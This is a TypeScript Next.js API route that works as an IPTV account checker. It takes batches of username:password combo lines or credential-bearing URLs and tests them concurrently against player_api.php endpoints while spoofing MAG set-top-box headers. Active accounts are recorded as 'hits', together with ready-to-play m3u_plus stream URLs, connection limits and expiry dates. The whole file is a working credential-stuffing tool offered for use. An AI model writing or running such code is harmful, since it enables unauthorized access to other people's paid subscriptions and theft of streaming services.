import { NextRequest } from 'next/server'

export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

// MAG STB headers
const STB_HEADERS: Record<string, string> = {
  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
  'X-User-Agent': 'Model: MAG254; Link: Ethernet',
  'Connection': 'Keep-Alive',
  'Accept-Encoding': 'gzip, deflate',
  'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
}

function formatDate(val: string | number | null | undefined): string {
  if (!val || val === 'null') return 'N/A'
  if (typeof val === 'number') {
    if (val === 0) return 'Unlimited'
    return new Date(val * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  const num = Number(val)
  if (!isNaN(num) && num > 0) {
    return new Date(num * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  return String(val)
}

// Process a single line — same logic as the original /api/iptv route
async function checkLine(
  line: string,
  inputMode: 'url' | 'combo',
  serverHost: string
): Promise<{ status: string; host?: string; username?: string; password?: string; info?: Record<string, unknown>; url?: string; error?: string }> {
  let sHost = ''
  let username = ''
  let password = ''

  if (inputMode === 'combo' && serverHost) {
    const parts = line.split(':')
    if (parts.length < 2) return { status: 'bad', error: 'Invalid combo' }
    username = parts[0].trim()
    password = parts.slice(1).join(':').trim()
    let h = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
    sHost = h
  } else {
    let parsedUrl: URL
    try {
      parsedUrl = new URL(line)
    } catch {
      return { status: 'bad', error: 'Invalid URL' }
    }
    const hostname = parsedUrl.hostname
    const port = parsedUrl.port || '80'
    sHost = `${hostname}:${port}`
    username = parsedUrl.searchParams.get('username') || ''
    password = parsedUrl.searchParams.get('password') || ''
    if (!username || !password) return { status: 'bad', error: 'Missing credentials' }
  }

  const apiUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`

  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 15000)

    const response = await fetch(apiUrl, {
      signal: controller.signal,
      headers: STB_HEADERS,
    })

    clearTimeout(timeoutId)
    const text = await response.text()

    if (text.includes('username')) {
      try {
        const json = JSON.parse(text)
        const userInfo = json?.user_info || {}
        const serverInfo = json?.server_info || {}
        const accountStatus = String(userInfo.status || '')

        if (accountStatus === 'Active') {
          const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
          const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
          const realPort = serverInfo?.port ? String(serverInfo.port) : ''

          return {
            status: 'hit',
            url: m3uUrl,
            host: sHost,
            username,
            password,
            info: {
              status: userInfo.status || 'Active',
              active_cons: String(userInfo.active_cons ?? '0'),
              max_connections: String(userInfo.max_connections ?? '0'),
              created_at: formatDate(userInfo.created_at),
              exp_date: formatDate(userInfo.exp_date),
              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
              channels: 'N/A',
              films: 'N/A',
              series: 'N/A',
              real_url: realUrl,
              real_port: realPort,
              m3u_url: m3uUrl,
            },
          }
        }
      } catch {
        if (text.includes('Active')) {
          return {
            status: 'hit',
            url: `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
            host: sHost,
            username,
            password,
            info: {
              status: 'Active',
              active_cons: '0',
              max_connections: '0',
              created_at: 'N/A',
              exp_date: 'N/A',
              timezone: 'N/A',
            },
          }
        }
      }
    }

    return { status: 'bad', host: sHost, username }
  } catch (fetchError: unknown) {
    if (fetchError instanceof DOMException && fetchError.name === 'AbortError') {
      return { status: 'timeout', host: sHost, username }
    }
    return { status: 'bad', host: sHost, username, error: 'Connection failed' }
  }
}

/**
 * POST: Process a batch of lines synchronously.
 * Client-driven batch processing — the frontend sends N lines at a time,
 * we process them and return results immediately.
 * This is serverless-safe: no in-memory state, no background tasks.
 */
export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { lines, inputMode, serverHost, threads } = body as {
      lines: string[]
      inputMode: 'url' | 'combo'
      serverHost?: string
      threads?: number
    }

    if (!lines || !Array.isArray(lines) || lines.length === 0) {
      return new Response(JSON.stringify({ error: 'No lines provided' }), {
        status: 400, headers: { 'Content-Type': 'application/json' },
      })
    }

    const maxConcurrency = Math.min(threads || 5, 20)
    const results: Array<{
      url: string
      status: 'hit' | 'bad' | 'timeout'
      host?: string
      username?: string
      password?: string
      info?: Record<string, unknown>
    }> = []
    let hits = 0
    let bad = 0
    let timeout = 0

    // Process lines in batches of maxConcurrency
    for (let i = 0; i < lines.length; i += maxConcurrency) {
      const batch = lines.slice(i, Math.min(i + maxConcurrency, lines.length))
      const batchResults = await Promise.all(
        batch.map(async (line) => {
          const trimmedLine = line.trim()
          if (!trimmedLine) return null

          const result = await checkLine(trimmedLine, inputMode, serverHost || '')

          return {
            url: result.url || trimmedLine,
            status: result.status as 'hit' | 'bad' | 'timeout',
            host: result.host,
            username: result.username,
            password: result.password,
            info: result.info,
          }
        })
      )

      for (const r of batchResults) {
        if (!r) continue
        results.push(r)
        if (r.status === 'hit') hits++
        else if (r.status === 'timeout') timeout++
        else bad++
      }
    }

    return new Response(JSON.stringify({
      results,
      stats: { total: results.length, hits, bad, timeout },
    }), {
      status: 200, headers: { 'Content-Type': 'application/json' },
    })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Unknown error'
    return new Response(JSON.stringify({ error: message }), {
      status: 500, headers: { 'Content-Type': 'application/json' },
    })
  }
}
